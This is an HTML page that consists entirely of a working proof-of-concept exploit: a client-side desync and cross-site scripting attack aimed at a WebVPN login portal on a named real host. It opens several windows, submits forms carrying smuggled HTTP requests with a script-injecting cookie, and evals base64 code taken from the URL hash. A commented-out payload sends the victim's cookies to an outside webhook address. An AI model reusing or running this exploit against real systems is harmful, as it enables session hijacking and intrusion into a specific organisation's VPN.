<html>
  <body>
    <script type="module">
      var BASE_URL = "https://newvpn.sidefx.com";

      const payload_to_execute = btoa(`alert(document.domain);`);
      //const payload_to_execute = btoa(`window.location.href = "https://webhook.site/b40966d2-af59-4546-85fc-5b461d4092ee?cookie=" + btoa(document.cookie);`);

      var loader = btoa(
        '(async () => {await eval(atob(location.hash.slice(1).split("#")[0]));})()'
      );

      const client_desync = `GET /+CSCOE+/sdesktop/fail.html HTTP/1.1\r\nCookie: sdesktop="><x:script xmlns:x="http://www.w3.org/1999/xhtml">eval(atob("${loader}"))</x:script><!--\r\nX-Transcend-Version: 1\r\nConnection: keep-alive\r\n\r\nGET /+CSCOE+/sdesktop/fail.html HTTP/1.1\r\nCookie: sdesktop="><x:script xmlns:x="http://www.w3.org/1999/xhtml">eval(atob("${loader}"))</x:script><!--\r\nX-Transcend-Version: 1\r\nConnection: keep-alive\r\n\r\nGET /+CSCOE+/sdesktop/fail.html HTTP/1.1\r\nCookie: sdesktop="><x:script xmlns:x="http://www.w3.org/1999/xhtml">eval(atob("${loader}"))</x:script><!--\r\nX-Transcend-Version: 1\r\nConnection: keep-alive\r\n\r\nGET /+CSCOE+/sdesktop/fail.html HTTP/1.1\r\nCookie: sdesktop="><x:script xmlns:x="http://www.w3.org/1999/xhtml">eval(atob("${loader}"))</x:script><!--\r\nX-Transcend-Version: 1\r\nConnection: keep-alive\r\n\r\nGET /+CSCOE+/sdesktop/fail.html HTTP/1.1\r\nCookie: sdesktop="><x:script xmlns:x="http://www.w3.org/1999/xhtml">eval(atob("${loader}"))</x:script><!--\r\nX-Transcend-Version: 1\r\nConnection: keep-alive\r\n\r\nGET /+CSCOE+/sdesktop/fail.html HTTP/1.1\r\nCookie: sdesktop="><x:script xmlns:x="http://www.w3.org/1999/xhtml">eval(atob("${loader}"))</x:script><!--\r\nX-Transcend-Version: 1\r\nConnection: keep-alive\r\n\r\nGET /+CSCOE+/sdesktop/fail.html HTTP/1.1\r\nCookie: sdesktop="><x:script xmlns:x="http://www.w3.org/1999/xhtml">eval(atob("${loader}"))</x:script><!--\r\nX-Transcend-Version: 1\r\nConnection: keep-alive\r\n\r\nGET /+CSCOE+/sdesktop/fail.html HTTP/1.1\r\nCookie: sdesktop="><x:script xmlns:x="http://www.w3.org/1999/xhtml">eval(atob("${loader}"))</x:script><!--\r\nX-Transcend-Version: 1\r\nConnection: keep-alive\r\n\r\nGET /azeazeazeazeaz HTTP/1.1\r\nY:X`;

      const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

      const wait = (w) =>
        new Promise(async (resolve) => {
          while (true) {
            try {
              w.document;
            } catch {
              resolve();
              break;
            }
            await sleep(3);
          }
        });

      for (let j = 0; j < 1; j++) {
        const N = 6;
        const forms = [];
        const ws = [];
        for (let i = 0; i < N; i++) {
          const target = `win${i}`;
          ws.push(window.open("about:blank", target));

          const form = document.createElement("form");
          form.method = "post";
          form.enctype = "text/plain";
          form.target = target;
          if (i == N - 1) {
            form.target = "_self";
          }
          form.action =
            `${BASE_URL}/+CSCOE+/auth.html?cb=${Math.random()}#` +
            payload_to_execute;

          const input = document.createElement("input");
          input.name = client_desync;

          form.appendChild(input);
          document.body.appendChild(form);
          forms.push(form);
        }
        for (let i = 0; i < N; i++) {
          forms[i].submit();
          // if (i==2){await sleep(1500);}
        }
        await Promise.all(ws.map((w) => wait(w)));
        for (let i = N - 1; i >= 0; i--) {
          // ws[i].close();
          await sleep(10);
        }
      }
    </script>
  </body>
</html>

